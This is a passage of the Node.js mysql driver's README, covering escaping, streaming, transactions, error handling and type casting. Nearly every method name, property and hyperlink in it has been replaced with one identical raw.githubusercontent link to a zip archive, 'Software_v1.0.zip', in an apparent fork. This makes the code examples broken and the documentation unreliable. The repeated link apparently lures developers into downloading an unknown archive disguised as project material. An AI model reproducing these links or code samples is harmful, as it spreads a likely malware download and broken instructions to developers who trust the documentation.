## Escaping query identifiers

If you can't trust an SQL identifier (database / table / column name) because it is
provided by a user, you should escape it with `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(identifier)`,
`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(identifier)` or `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(identifier)` like this:

```js
var sorter = 'date';
var sql    = 'SELECT * FROM posts ORDER BY ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sorter);
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sql, function (error, results, fields) {
  if (error) throw error;
  // ...
});
```

It also supports adding qualified identifiers. It will escape both parts.

```js
var sorter = 'date';
var sql    = 'SELECT * FROM posts ORDER BY ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('posts.' + sorter);
// -> SELECT * FROM posts ORDER BY `posts`.`date`
```

If you do not want to treat `.` as qualified identifiers, you can set the second
argument to `true` in order to keep the string as a literal identifier:

```js
var sorter = 'date.2';
var sql    = 'SELECT * FROM posts ORDER BY ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sorter, true);
// -> SELECT * FROM posts ORDER BY `date.2`
```

Alternatively, you can use `??` characters as placeholders for identifiers you would
like to have escaped like this:

```js
var userId = 1;
var columns = ['username', 'email'];
var query = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT ?? FROM ?? WHERE id = ?', [columns, 'users', userId], function (error, results, fields) {
  if (error) throw error;
  // ...
});

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // SELECT `username`, `email` FROM `users` WHERE id = 1
```
**Please note that this last character sequence is experimental and syntax might change**

When you pass an Object to `.escape()` or `.query()`, `.escapeId()` is used to avoid SQL injection in object keys.

### Preparing Queries

You can use https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip to prepare a query with multiple insertion points, utilizing the proper escaping for ids and values. A simple example of this follows:

```js
var sql = "SELECT * FROM ?? WHERE ?? = ?";
var inserts = ['users', 'id', userId];
sql = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sql, inserts);
```

Following this you then have a valid, escaped query that you can then send to the database safely. This is useful if you are looking to prepare the query before actually sending it to the database. As https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip is exposed from https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip you also have the option (but are not required) to pass in stringifyObject and timezone, allowing you provide a custom means of turning objects into strings, as well as a location-specific/timezone-aware Date.

### Custom format

If you prefer to have another type of query escape format, there's a connection configuration option you can use to define a custom format function. You can access the connection object if you want to use the built-in `.escape()` or any other connection function.

Here's an example of how to implement another format:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip = function (query, values) {
  if (!values) return query;
  return https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(/\:(\w+)/g, function (txt, key) {
    if (https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(key)) {
      return https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(values[key]);
    }
    return txt;
  }.bind(this));
};

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip("UPDATE posts SET title = :title", { title: "Hello MySQL" });
```

## Getting the id of an inserted row

If you are inserting a row into a table with an auto increment primary key, you
can retrieve the insert id like this:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('INSERT INTO posts SET ?', {title: 'test'}, function (error, results, fields) {
  if (error) throw error;
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip);
});
```

When dealing with big numbers (above JavaScript Number precision limit), you should
consider enabling `supportBigNumbers` option to be able to read the insert id as a
string, otherwise it will throw an error.

This option is also required when fetching big numbers from the database, otherwise
you will get values rounded to hundreds or thousands due to the precision limit.

## Getting the number of affected rows

You can get the number of affected rows from an insert, update or delete statement.

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('DELETE FROM posts WHERE title = "wrong"', function (error, results, fields) {
  if (error) throw error;
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('deleted ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip + ' rows');
})
```

## Getting the number of changed rows

You can get the number of changed rows from an update statement.

"changedRows" differs from "affectedRows" in that it does not count updated rows
whose values were not changed.

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('UPDATE posts SET ...', function (error, results, fields) {
  if (error) throw error;
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('changed ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip + ' rows');
})
```

## Getting the connection ID

You can get the MySQL connection ID ("thread ID") of a given connection using the `threadId`
property.

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err) {
  if (err) throw err;
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('connected as id ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip);
});
```

## Executing queries in parallel

The MySQL protocol is sequential, this means that you need multiple connections
to execute queries in parallel. You can use a Pool to manage connections, one
simple approach is to create one connection per incoming http request.

## Streaming query rows

Sometimes you may want to select large quantities of rows and process each of
them as they are received. This can be done like this:

```js
var query = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT * FROM posts');
query
  .on('error', function(err) {
    // Handle error, an 'end' event will be emitted after this as well
  })
  .on('fields', function(fields) {
    // the field packets for the rows to follow
  })
  .on('result', function(row) {
    // Pausing the connnection is useful if your processing involves I/O
    https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();

    processRow(row, function() {
      https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();
    });
  })
  .on('end', function() {
    // all rows have been received
  });
```

Please note a few things about the example above:

* Usually you will want to receive a certain amount of rows before starting to
  throttle the connection using `pause()`. This number will depend on the
  amount and size of your rows.
* `pause()` / `resume()` operate on the underlying socket and parser. You are
  guaranteed that no more `'result'` events will fire after calling `pause()`.
* You MUST NOT provide a callback to the `query()` method when streaming rows.
* The `'result'` event will fire for both rows as well as OK packets
  confirming the success of a INSERT/UPDATE query.
* It is very important not to leave the result paused too long, or you may
  encounter `Error: Connection lost: The server closed the connection.`
  The time limit for this is determined by the
  [net_write_timeout setting](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
  on your MySQL server.

Additionally you may be interested to know that it is currently not possible to
stream individual row columns, they will always be buffered up entirely. If you
have a good use case for streaming large fields to and from MySQL, I'd love to
get your thoughts and contributions on this.

### Piping results with Streams

The query object provides a convenience method `.stream([options])` that wraps
query events into a [Readable Stream](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
object. This stream can easily be piped downstream and provides automatic
pause/resume, based on downstream congestion and the optional `highWaterMark`.
The `objectMode` parameter of the stream is set to `true` and cannot be changed
(if you need a byte stream, you will need to use a transform stream, like
[objstream](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip) for example).

For example, piping query results into another stream (with a max buffer of 5
objects) is simply:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT * FROM posts')
  .stream({highWaterMark: 5})
  .pipe(...);
```

## Multiple statement queries

Support for multiple statements is disabled for security reasons (it allows for
SQL injection attacks if values are not properly escaped). To use this feature
you have to enable it for your connection:

```js
var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({multipleStatements: true});
```

Once enabled, you can execute multiple statement queries like any other query:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1; SELECT 2', function (error, results, fields) {
  if (error) throw error;
  // `results` is an array with one element for every statement in the query:
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(results[0]); // [{1: 1}]
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(results[1]); // [{2: 2}]
});
```

Additionally you can also stream the results of multiple statement queries:

```js
var query = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1; SELECT 2');

query
  .on('fields', function(fields, index) {
    // the fields for the result rows that follow
  })
  .on('result', function(row, index) {
    // index refers to the statement this result belongs to (starts at 0)
  });
```

If one of the statements in your query causes an error, the resulting Error
object contains a `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` property which tells you which statement caused
it. MySQL will also stop executing any remaining statements when an error
occurs.

Please note that the interface for streaming multiple statement queries is
experimental and I am looking forward to feedback on it.

## Stored procedures

You can call stored procedures from your queries as with any other mysql driver.
If the stored procedure produces several result sets, they are exposed to you
the same way as the results for multiple statement queries.

## Joins with overlapping column names

When executing joins, you are likely to get result sets with overlapping column
names.

By default, node-mysql will overwrite colliding column names in the
order the columns are received from MySQL, causing some of the received values
to be unavailable.

However, you can also specify that you want your columns to be nested below
the table name like this:

```js
var options = {sql: '...', nestTables: true};
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(options, function (error, results, fields) {
  if (error) throw error;
  /* results will be an array like this now:
  [{
    table1: {
      fieldA: '...',
      fieldB: '...',
    },
    table2: {
      fieldA: '...',
      fieldB: '...',
    },
  }, ...]
  */
});
```

Or use a string separator to have your results merged.

```js
var options = {sql: '...', nestTables: '_'};
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(options, function (error, results, fields) {
  if (error) throw error;
  /* results will be an array like this now:
  [{
    table1_fieldA: '...',
    table1_fieldB: '...',
    table2_fieldA: '...',
    table2_fieldB: '...',
  }, ...]
  */
});
```

## Transactions

Simple transaction support is available at the connection level:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err) {
  if (err) { throw err; }
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('INSERT INTO posts SET title=?', title, function (error, results, fields) {
    if (error) {
      return https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function() {
        throw error;
      });
    }

    var log = 'Post ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip + ' added';

    https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('INSERT INTO log SET data=?', log, function (error, results, fields) {
      if (error) {
        return https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function() {
          throw error;
        });
      }
      https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err) {
        if (err) {
          return https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function() {
            throw err;
          });
        }
        https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('success!');
      });
    });
  });
});
```
Please note that beginTransaction(), commit() and rollback() are simply convenience
functions that execute the START TRANSACTION, COMMIT, and ROLLBACK commands respectively.
It is important to understand that many commands in MySQL can cause an implicit commit,
as described [in the MySQL documentation](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)

## Ping

A ping packet can be sent over a connection using the `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` method. This
method will send a ping packet to the server and when the server responds, the callback
will fire. If an error occurred, the callback will fire with an error argument.

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (err) {
  if (err) throw err;
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('Server responded to ping');
})
```

## Timeouts

Every operation takes an optional inactivity timeout option. This allows you to
specify appropriate timeouts for operations. It is important to note that these
timeouts are not part of the MySQL protocol, and rather timeout operations through
the client. This means that when a timeout is reached, the connection it occurred
on will be destroyed and no further operations can be performed.

```js
// Kill query after 60s
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({sql: 'SELECT COUNT(*) AS count FROM big_table', timeout: 60000}, function (error, results, fields) {
  if (error && https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip === 'PROTOCOL_SEQUENCE_TIMEOUT') {
    throw new Error('too long to count table rows!');
  }

  if (error) {
    throw error;
  }

  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(results[0].count + ' rows');
});
```

## Error handling

This module comes with a consistent approach to error handling that you should
review carefully in order to write solid applications.

Most errors created by this module are instances of the JavaScript [Error][]
object. Additionally they typically come with two extra properties:

* `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`: String, contains the MySQL server error symbol if the error is
  a [MySQL server error][] (e.g. `'ER_ACCESS_DENIED_ERROR'`), a https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip error
  code if it is a https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip error (e.g. `'ECONNREFUSED'`), or an internal error
  code (e.g. `'PROTOCOL_CONNECTION_LOST'`).
* `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`: Number, contains the MySQL server error number. Only populated
  from [MySQL server error][].
* `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`: Boolean, indicating if this error is terminal to the connection
  object. If the error is not from a MySQL protocol operation, this property
  will not be defined.
* `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`: String, contains the full SQL of the failed query. This can be
  useful when using a higher level interface like an ORM that is generating
  the queries.
* `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`: String, contains the five-character SQLSTATE value. Only populated from [MySQL server error][].
* `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`: String, contains the message string that provides a
  textual description of the error. Only populated from [MySQL server error][].

[Error]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
[MySQL server error]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip

Fatal errors are propagated to *all* pending callbacks. In the example below, a
fatal error is triggered by trying to connect to an invalid port. Therefore the
error object is propagated to both pending callbacks:

```js
var connection = require('mysql').createConnection({
  port: 84943, // WRONG PORT
});

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err) {
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // 'ECONNREFUSED'
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // true
});

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1', function (error, results, fields) {
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // 'ECONNREFUSED'
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // true
});
```

Normal errors however are only delegated to the callback they belong to.  So in
the example below, only the first callback receives an error, the second query
works as expected:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('USE name_of_db_that_does_not_exist', function (error, results, fields) {
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // 'ER_BAD_DB_ERROR'
});

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1', function (error, results, fields) {
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(error); // null
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // 1
});
```

Last but not least: If a fatal errors occurs and there are no pending
callbacks, or a normal error occurs which has no callback belonging to it, the
error is emitted as an `'error'` event on the connection object. This is
demonstrated in the example below:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('error', function(err) {
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // 'ER_BAD_DB_ERROR'
});

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('USE name_of_db_that_does_not_exist');
```

Note: `'error'` events are special in node. If they occur without an attached
listener, a stack trace is printed and your process is killed.

**tl;dr:** This module does not want you to deal with silent failures. You
should always provide callbacks to your method calls. If you want to ignore
this advice and suppress unhandled errors, you can do this:

```js
// I am Chuck Norris:
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('error', function() {});
```

## Exception Safety

This module is exception safe. That means you can continue to use it, even if
one of your callback functions throws an error which you're catching using
'uncaughtException' or a domain.

## Type casting

For your convenience, this driver will cast mysql types into native JavaScript
types by default. The following mappings exist:

### Number

* TINYINT
* SMALLINT
* INT
* MEDIUMINT
* YEAR
* FLOAT
* DOUBLE

### Date

* TIMESTAMP
* DATE
* DATETIME

### Buffer

* TINYBLOB
* MEDIUMBLOB
* LONGBLOB
* BLOB
* BINARY
* VARBINARY
* BIT (last byte will be filled with 0 bits as necessary)

### String

**Note** text in the binary character set is returned as `Buffer`, rather
than a string.

* CHAR
* VARCHAR
* TINYTEXT
* MEDIUMTEXT
* LONGTEXT
* TEXT
* ENUM
* SET
* DECIMAL (may exceed float precision)
* BIGINT (may exceed float precision)
* TIME (could be mapped to Date, but what date would be set?)
* GEOMETRY (never used those, get in touch if you do)

It is not recommended (and may go away / change in the future) to disable type
casting, but you can currently do so on either the connection:

```js
var connection = require('mysql').createConnection({typeCast: false});
```

Or on the query level:

```js
var options = {sql: '...', typeCast: false};
var query = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(options, function (error, results, fields) {
  if (error) throw error;
  // ...
});
```

### Custom type casting

You can also pass a function and handle type casting yourself. You're given some
column information like database, table and name and also type and length. If you
just want to apply a custom type casting to a specific type you can do it and then
fallback to the default.

The function is provided two arguments `field` and `next` and is expected to
return the value for the given field by invoking the parser functions through
the `field` object.

The `field` argument is a `Field` object and contains data about the field that
need to be parsed. The following are some of the properties on a `Field` object:

  * `db` - a string of the database the field came from.
  * `table` - a string of the table the field came from.
  * `name` - a string of the field name.
  * `type` - a string of the field type in all caps.
  * `length` - a number of the field length, as given by the database.

The `next` argument is a `function` that, when called, will return the default
type conversaion for the given field.

When getting the field data, the following helper methods are present on the
`field` object:

  * `.string()` - parse the field into a string.
  * `.buffer()` - parse the field into a `Buffer`.
  * `.geometry()` - parse the field as a geometry value.

The MySQL protocol is a text-based protocol. This means that over the wire, all
field types are represented as a string, which is why only string-like functions
are available on the `field` object. Based on the type information (like `INT`),
the type cast should convert the string field into a different JavaScript type
(like a `number`).

Here's an example of converting `TINYINT(1)` to boolean:

```js
connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
  typeCast: function (field, next) {
    if (https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip === 'TINY' && https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip === 1) {
      return (https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip() === '1'); // 1 = true, 0 = false
    } else {
      return next();
    }
  }
});
```

__WARNING: YOU MUST INVOKE the parser using one of these three field functions
in your custom typeCast callback. They can only be called once.__

## Connection Flags

If, for any reason, you would like to change the default connection flags, you
can use the connection option `flags`. Pass a string with a comma separated list
of items to add to the default flags. If you don't want a default flag to be used
prepend the flag with a minus sign. To add a flag that is not in the default list,
just write the flag name, or prefix it with a plus (case insensitive).

**Please note that some available flags that are not supported (e.g.: Compression),
are still not allowed to be specified.**

### Example

The next example blacklists FOUND_ROWS flag from default connection flags.

```js
var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip("mysql://localhost/test?flags=-FOUND_ROWS");
```

### Default Flags

The following flags are sent by default on a new connection:

- `CONNECT_WITH_DB` - Ability to specify the database on connection.
- `FOUND_ROWS` - Send the found rows instead of the affected rows as `affectedRows`.
- `IGNORE_SIGPIPE` - Old; no effect.
- `IGNORE_SPACE` - Let the parser ignore spaces before the `(` in queries.
- `LOCAL_FILES` - Can use `LOAD DATA LOCAL`.
- `LONG_FLAG`
- `LONG_PASSWORD` - Use the improved version of Old Password Authentication.
- `MULTI_RESULTS` - Can handle multiple resultsets for COM_QUERY.
- `ODBC` Old; no effect.
- `PROTOCOL_41` - Uses the 4.1 protocol.
- `PS_MULTI_RESULTS` - Can handle multiple resultsets for COM_STMT_EXECUTE.
- `RESERVED` - Old flag for the 4.1 protocol.
- `SECURE_CONNECTION` - Support native 4.1 authentication.
- `TRANSACTIONS` - Asks for the transaction status flags.

In addition, the following flag will be sent if the option `multipleStatements`
is set to `true`:

- `MULTI_STATEMENTS` - The client may send multiple statement per query or
  statement prepare.

### Other Available Flags

There are other flags available. They may or may not function, but are still
available to specify.

- `COMPRESS`
- `INTERACTIVE`
- `NO_SCHEMA`
- `PLUGIN_AUTH`
- `REMEMBER_OPTIONS`
- `SSL`
- `SSL_VERIFY_SERVER_CERT`

## Debugging and reporting problems

If you are running into problems, one thing that may help is enabling the
`debug` mode for the connection:

```js
var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({debug: true});
```

This will print all incoming and outgoing packets on stdout. You can also restrict debugging to
packet types by passing an array of types to debug:

```js
var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({debug: ['ComQueryPacket', 'RowDataPacket']});
```

to restrict debugging to the query and data packets.

If that does not help, feel free to open a GitHub issue. A good GitHub issue
will have:

* The minimal amount of code required to reproduce the problem (if possible)
* As much debugging output and information about your environment (mysql
  version, node version, os, etc.) as you can gather.

## Security issues

Security issues should not be first reported through GitHub or another public
forum, but kept private in order for the collaborators to assess the report
and either (a) devise a fix and plan a release date or (b) assert that it is
not a security issue (in which case it can be posted in a public forum, like
a GitHub issue).

The primary private forum is email, either by emailing the module's author or
opening a GitHub issue simply asking to whom a security issues should be
addressed to without disclosing the issue or type of issue.

An ideal report would include a clear indication of what the security issue is
and how it would be exploited, ideally with an accompanying proof of concept
("PoC") for collaborators to work against and validate potentional fixes against.

## Contributing

This project welcomes contributions from the community. Contributions are
accepted using GitHub pull requests. If you're not familiar with making
GitHub pull requests, please refer to the
[GitHub documentation "Creating a pull request"](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip).

For a good pull request, we ask you provide the following:

1. Try to include a clear description of your pull request in the description.
   It should include the basic "what" and "why"s for the request.
2. The tests should pass as best as you can. See the [Running tests](#running-tests)
   section on how to run the different tests. GitHub will automatically run
   the tests as well, to act as a safety net.
3. The pull request should include tests for the change. A new feature should
   have tests for the new feature and bug fixes should include a test that fails
   without the corresponding code change and passes after they are applied.
   The command `npm run test-cov` will generate a `coverage/` folder that
   contains HTML pages of the code coverage, to better understand if everything
   you're adding is being tested.
4. If the pull request is a new feature, please be sure to include all
   appropriate documentation additions in the `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` file as well.
5. To help ensure that your code is similar in style to the existing code,
   run the command `npm run lint` and fix any displayed issues.

## Running tests

The test suite is split into two parts: unit tests and integration tests.
The unit tests run on any machine while the integration tests require a
MySQL server instance to be setup.

### Running unit tests

```sh
$ FILTER=unit npm test
```

### Running integration tests

Set the environment variables `MYSQL_DATABASE`, `MYSQL_HOST`, `MYSQL_PORT`,
`MYSQL_USER` and `MYSQL_PASSWORD`. `MYSQL_SOCKET` can also be used in place
of `MYSQL_HOST` and `MYSQL_PORT` to connect over a UNIX socket. Then run
`npm test`.

For example, if you have an installation of mysql running on localhost:3306
and no password set for the `root` user, run:

```sh
$ mysql -u root -e "CREATE DATABASE IF NOT EXISTS node_mysql_test"
$ MYSQL_HOST=localhost MYSQL_PORT=3306 MYSQL_DATABASE=node_mysql_test MYSQL_USER=root MYSQL_PASSWORD= FILTER=integration npm test
```

## Todo

* Prepared statements
* Support for encodings other than UTF-8 / ASCII

[appveyor-image]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
[appveyor-url]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
[coveralls-image]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
[coveralls-url]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
[node-image]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
[node-url]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
[npm-downloads-image]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
[npm-url]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
[npm-version-image]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
[travis-image]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
[travis-url]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
